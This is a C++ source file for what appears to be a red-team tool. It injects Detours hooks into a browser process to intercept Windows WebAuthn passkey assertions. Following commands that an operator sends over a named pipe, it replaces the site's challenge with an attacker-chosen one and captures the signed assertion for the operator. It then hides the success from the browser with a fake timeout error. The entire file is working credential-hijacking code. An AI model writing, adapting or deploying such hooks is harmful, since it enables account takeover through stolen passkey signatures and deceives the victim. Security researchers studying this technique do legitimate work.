#include "WebAuthnHook.h"
#include "NamedPipe.h"

#include <detours/detours.h>

#if defined(_MSC_VER)
#pragma warning(push, 0)
// Third-party headers trip these MSVC/analyzer diagnostics:
// C4702: unreachable code.
// C6297: 32-bit value is shifted before being cast to a larger type.
// C6319: comma operator in a tested expression ignores the left argument.
// C26495: member variable is not initialized by a constructor or initializer.
// C33010: enum is used as an array index without a lower-bound check.
#pragma warning(disable: 4702 6297 6319 26495 33010)
#endif
#include <rapidjson/document.h>
#if defined(_MSC_VER)
#pragma warning(pop)
#endif

#include <cwchar>
#include <optional>
#include <string>
#include <string_view>
#include <utility>

namespace SpecterOps::Passkeys::WebAuthnHook
{
    constexpr const wchar_t* WebAuthnModuleName = L"webauthn.dll";
    constexpr const char* GetAssertionExportName = "WebAuthNAuthenticatorGetAssertion";
    constexpr const char* FreeAssertionExportName = "WebAuthNFreeAssertion";

    using WebAuthNAuthenticatorGetAssertionFn = HRESULT(WINAPI*)(
        HWND hwnd,
        LPCWSTR rpId,
        WEBAUTHN_CLIENT_DATA* clientData,
        WEBAUTHN_AUTHENTICATOR_GET_ASSERTION_OPTIONS* options,
        WEBAUTHN_ASSERTION** assertion);

    using WebAuthNFreeAssertionFn = void(WINAPI*)(WEBAUTHN_ASSERTION* assertion);
    using LoadLibraryWFn = HMODULE(WINAPI*)(LPCWSTR fileName);
    using LoadLibraryExWFn = HMODULE(WINAPI*)(LPCWSTR fileName, HANDLE file, DWORD flags);

    // Original API entrypoints that Detours rewrites in place.
    WebAuthNAuthenticatorGetAssertionFn TrueWebAuthNAuthenticatorGetAssertion = nullptr;
    WebAuthNFreeAssertionFn TrueWebAuthNFreeAssertion = nullptr;
    LoadLibraryWFn TrueLoadLibraryW = ::LoadLibraryW;
    LoadLibraryExWFn TrueLoadLibraryExW = ::LoadLibraryExW;

    // Guards against attaching the assertion detour more than once per process.
    volatile LONG g_assertionHookInstalled = 0;

    // Tracks whether the LoadLibrary bootstrap detours were installed, so detach
    // skips them when the assertion hook was armed directly at DLL attach.
    volatile LONG g_bootstrapHooksInstalled = 0;

    namespace
    {
        /// Returns the current process image name without the .exe suffix.
        std::wstring GetCurrentProcessName()
        {
            wchar_t path[MAX_PATH]{};
            const DWORD length = ::GetModuleFileNameW(nullptr, path, MAX_PATH);
            if (length == 0 || length >= MAX_PATH)
            {
                return L"<unknown>";
            }

            const wchar_t* fileName = wcsrchr(path, L'\\');
            fileName = fileName == nullptr ? path : fileName + 1;

            std::wstring processName(fileName);
            const size_t extensionIndex = processName.rfind(L'.');
            if (extensionIndex != std::wstring::npos)
            {
                processName.resize(extensionIndex);
            }

            return processName;
        }

        /// Returns the user name associated with the current process token.
        std::wstring GetCurrentUserName()
        {
            constexpr DWORD MaxUserNameChars = 256;
            wchar_t userName[MaxUserNameChars]{};
            DWORD length = MaxUserNameChars;
            if (!::GetUserNameW(userName, &length) || length <= 1)
            {
                return L"<unknown>";
            }

            return std::wstring(userName, length - 1);
        }

        /// Requests an assertion action from the pipe server, honoring wait responses until a final action arrives.
        std::optional<std::string> GetAssertionActionMessage(
            const std::wstring_view rpId,
            const std::wstring_view processName,
            const std::wstring_view userName,
            const DWORD pid)
        {
            HookPipeAction previousAction = HookPipeAction::Unknown;
            DWORD timeoutMs = DefaultPipeResponseTimeoutMs;
            std::optional<std::string> actionMessage;

            do
            {
                const std::string startedMessage = BuildAssertionStartedMessage(rpId, processName, userName, pid, previousAction);
                actionMessage = SendPipeMessage(startedMessage, timeoutMs);
                if (!actionMessage.has_value())
                {
                    break;
                }

                previousAction = ParsePipeMessageAction(*actionMessage);

                // The server actively communicates with us, so increase the timeout from 1s to 60s.
                timeoutMs = WaitPipeResponseTimeoutMs;
            }
            while (previousAction == HookPipeAction::Wait);

            return actionMessage;
        }

        /// Parses the challenge value from an inject action message.
        std::optional<std::string> ParseInjectChallenge(const std::string_view actionMessage)
        {
            rapidjson::Document actionDocument;
            if (!TryParseJsonObject(actionMessage, actionDocument))
            {
                return std::nullopt;
            }

            const rapidjson::Value::ConstMemberIterator challenge = actionDocument.FindMember("challenge");
            if (challenge == actionDocument.MemberEnd() || !challenge->value.IsString())
            {
                return std::nullopt;
            }

            return std::string(challenge->value.GetString(), challenge->value.GetStringLength());
        }

        /// Returns true when a browser-style LoadLibrary target names webauthn.dll directly.
        bool IsWebAuthnModuleLoadTarget(LPCWSTR fileName)
        {
            return fileName != nullptr && ::_wcsicmp(fileName, WebAuthnModuleName) == 0;
        }
    }

    /// Detour entrypoint that optionally modifies and forwards WebAuthN assertion requests.
    HRESULT WINAPI HookWebAuthNAuthenticatorGetAssertion(
        HWND hwnd,
        LPCWSTR rpId,
        WEBAUTHN_CLIENT_DATA* clientData,
        WEBAUTHN_AUTHENTICATOR_GET_ASSERTION_OPTIONS* options,
        WEBAUTHN_ASSERTION** assertion)
    {
        // Retrieve process context once so all pipe messages share the same values
        // without repeating the OS lookups.
        const std::wstring_view rpIdView  = rpId ? rpId : L"";
        const std::wstring      processName = GetCurrentProcessName();
        const std::wstring      userName    = GetCurrentUserName();
        const DWORD             pid         = ::GetCurrentProcessId();

        const std::optional<std::string> actionMessage =
            GetAssertionActionMessage(rpIdView, processName, userName, pid);
        const HookPipeAction action = actionMessage.has_value()
            ? ParsePipeMessageAction(*actionMessage)
            : HookPipeAction::Unknown;

        std::string injectedClientDataJson;
        WEBAUTHN_CLIENT_DATA injectedClientData{};
        PBYTE originalClientDataJson = nullptr;
        DWORD originalClientDataJsonSize = 0;
        bool hasInjectedClientData = false;

        if (action == HookPipeAction::Inject)
        {
            // Replace the challenge sent by the browser with data provided by the operator
            std::optional<std::string> replacement;
            if (const std::optional<std::string> challenge = ParseInjectChallenge(*actionMessage); challenge.has_value())
            {
                replacement = BuildClientDataJsonWithChallenge(clientData, *challenge);
            }

            if (replacement.has_value())
            {
                injectedClientDataJson = std::move(*replacement);
                injectedClientData = *clientData;
                injectedClientData.pbClientDataJSON = reinterpret_cast<PBYTE>(injectedClientDataJson.data());
                injectedClientData.cbClientDataJSON = static_cast<DWORD>(injectedClientDataJson.size());

                originalClientDataJson = clientData->pbClientDataJSON;
                originalClientDataJsonSize = clientData->cbClientDataJSON;
                clientData->pbClientDataJSON = injectedClientData.pbClientDataJSON;
                clientData->cbClientDataJSON = injectedClientData.cbClientDataJSON;
                hasInjectedClientData = true;
            }
        }

        // Forward the request to Windows
        const HRESULT result = TrueWebAuthNAuthenticatorGetAssertion(hwnd, rpId, clientData, options, assertion);

        if (hasInjectedClientData)
        {
            // Revert the challenge after the call
            clientData->pbClientDataJSON = originalClientDataJson;
            clientData->cbClientDataJSON = originalClientDataJsonSize;
        }

        if (SUCCEEDED(result) && assertion != nullptr && *assertion != nullptr)
        {
            const WEBAUTHN_CLIENT_DATA* pipeClientData = hasInjectedClientData ? &injectedClientData : clientData;
            SendPipeMessage(BuildAssertionCompletedMessage(rpIdView, processName, userName, pid, pipeClientData, *assertion, action));

            if (action == HookPipeAction::Capture || action == HookPipeAction::Inject)
            {
                // Free the memory which the browser would normally have done upon success
                TrueWebAuthNFreeAssertion(*assertion);
                *assertion = nullptr;

                // Send a fake error to the browser, even though the assertion succeeded
                return HRESULT_FROM_WIN32(ERROR_TIMEOUT);
            }
            else
            {
                // Pass-through the success to the browser
                return result;
            }
        }
        else
        {
            // Inform the operator about the error
            SendPipeMessage(BuildAssertionErrorMessage(rpIdView, processName, userName, pid, result, action));

            // Pass-through the error to the browser
            return result;
        }
    }

    /// LoadLibraryW detour that arms the assertion hook after webauthn.dll is loaded lazily.
    HMODULE WINAPI HookLoadLibraryW(LPCWSTR fileName)
    {
        const HMODULE module = TrueLoadLibraryW(fileName);
        if (IsWebAuthnModuleLoadTarget(fileName))
        {
            AttachAssertionHook();
        }
        return module;
    }

    /// LoadLibraryExW detour that arms the assertion hook after webauthn.dll is loaded lazily.
    HMODULE WINAPI HookLoadLibraryExW(LPCWSTR fileName, HANDLE file, DWORD flags)
    {
        const HMODULE module = TrueLoadLibraryExW(fileName, file, flags);
        if (IsWebAuthnModuleLoadTarget(fileName))
        {
            AttachAssertionHook();
        }
        return module;
    }

    /// Installs the WebAuthNAuthenticatorGetAssertion detour when the target export is available.
    /// Browsers often load webauthn.dll lazily, so installation can be retried after DLL load events.
    bool AttachAssertionHook()
    {
        if (::InterlockedCompareExchange(&g_assertionHookInstalled, 1, 0) != 0)
        {
            return true;
        }

        const HMODULE webAuthnModule = ::GetModuleHandleW(WebAuthnModuleName);
        if (webAuthnModule == nullptr)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        const auto target = reinterpret_cast<WebAuthNAuthenticatorGetAssertionFn>(
            ::GetProcAddress(webAuthnModule, GetAssertionExportName));
        if (target == nullptr)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        TrueWebAuthNAuthenticatorGetAssertion = target;
        TrueWebAuthNFreeAssertion = reinterpret_cast<WebAuthNFreeAssertionFn>(
            ::GetProcAddress(webAuthnModule, FreeAssertionExportName));
        if (TrueWebAuthNFreeAssertion == nullptr)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        if (DetourTransactionBegin() != NO_ERROR)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        DetourUpdateThread(::GetCurrentThread());
        const LONG attachResult = DetourAttach(
            reinterpret_cast<PVOID*>(&TrueWebAuthNAuthenticatorGetAssertion),
            HookWebAuthNAuthenticatorGetAssertion);
        if (attachResult != NO_ERROR)
        {
            DetourTransactionAbort();
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        const LONG commitResult = DetourTransactionCommit();
        if (commitResult != NO_ERROR)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
            return false;
        }

        return true;
    }

    /// Installs LoadLibrary detours that watch for webauthn.dll when it is not loaded at DLL attach time.
    bool AttachBootstrapHooks()
    {
        if (DetourTransactionBegin() != NO_ERROR)
        {
            return false;
        }

        DetourUpdateThread(::GetCurrentThread());
        const LONG loadLibraryResult = DetourAttach(reinterpret_cast<PVOID*>(&TrueLoadLibraryW), HookLoadLibraryW);
        if (loadLibraryResult != NO_ERROR)
        {
            DetourTransactionAbort();
            return false;
        }

        const LONG loadLibraryExResult = DetourAttach(reinterpret_cast<PVOID*>(&TrueLoadLibraryExW), HookLoadLibraryExW);
        if (loadLibraryExResult != NO_ERROR)
        {
            DetourTransactionAbort();
            return false;
        }

        const LONG commitResult = DetourTransactionCommit();
        if (commitResult != NO_ERROR)
        {
            return false;
        }

        ::InterlockedExchange(&g_bootstrapHooksInstalled, 1);
        return true;
    }

    /// Removes any installed assertion or bootstrap detours before the hook DLL unloads.
    void DetachHooks()
    {
        if (DetourTransactionBegin() != NO_ERROR)
        {
            return;
        }

        DetourUpdateThread(::GetCurrentThread());

        const bool detachAssertionHook = ::InterlockedCompareExchange(&g_assertionHookInstalled, 1, 1) == 1
            && TrueWebAuthNAuthenticatorGetAssertion != nullptr;
        if (detachAssertionHook)
        {
            const LONG detachResult = DetourDetach(
                reinterpret_cast<PVOID*>(&TrueWebAuthNAuthenticatorGetAssertion),
                HookWebAuthNAuthenticatorGetAssertion);
            if (detachResult != NO_ERROR)
            {
                DetourTransactionAbort();
                return;
            }
        }

        const bool detachBootstrapHooks = ::InterlockedCompareExchange(&g_bootstrapHooksInstalled, 1, 1) == 1;
        if (detachBootstrapHooks)
        {
            const LONG detachLoadLibraryResult = DetourDetach(
                reinterpret_cast<PVOID*>(&TrueLoadLibraryW),
                HookLoadLibraryW);
            if (detachLoadLibraryResult != NO_ERROR)
            {
                DetourTransactionAbort();
                return;
            }

            const LONG detachLoadLibraryExResult = DetourDetach(
                reinterpret_cast<PVOID*>(&TrueLoadLibraryExW),
                HookLoadLibraryExW);
            if (detachLoadLibraryExResult != NO_ERROR)
            {
                DetourTransactionAbort();
                return;
            }
        }

        if (DetourTransactionCommit() != NO_ERROR)
        {
            return;
        }

        if (detachAssertionHook)
        {
            ::InterlockedExchange(&g_assertionHookInstalled, 0);
        }

        if (detachBootstrapHooks)
        {
            ::InterlockedExchange(&g_bootstrapHooksInstalled, 0);
        }
    }
}
